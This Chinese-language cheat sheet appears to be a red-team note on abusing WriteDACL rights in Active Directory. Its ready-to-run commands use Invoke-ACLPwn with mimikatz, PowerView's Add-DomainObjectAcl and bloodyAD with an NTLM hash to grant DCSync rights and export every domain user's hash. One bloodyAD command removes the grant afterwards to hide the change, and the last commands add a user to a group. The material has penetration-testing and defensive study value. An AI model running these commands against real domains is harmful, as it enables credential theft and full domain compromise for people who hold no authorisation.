	WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash
	Invoke-ACLPwn是一个自动发现和 pwnage Active Directory 中配置不安全的 ACL 的工具
	https://github.com/fox-it/Invoke-ACLPwn
	>./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
  #### 域上的 WriteDACL
	Windows 上
	将 DCSync 权限授予主体身份
	>Import-Module .\PowerView.ps1
	>$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
	>$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
	>Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
	Linux 上
	将 DCSync 权限授予主体身份
	>bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B addDomainSync user2
	DCSync后移除权限
	>bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B delDomainSync user2
  #### 组上的 WriteDACL
	>Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
	>net group "INTERESTING_GROUP" User1 /add /domain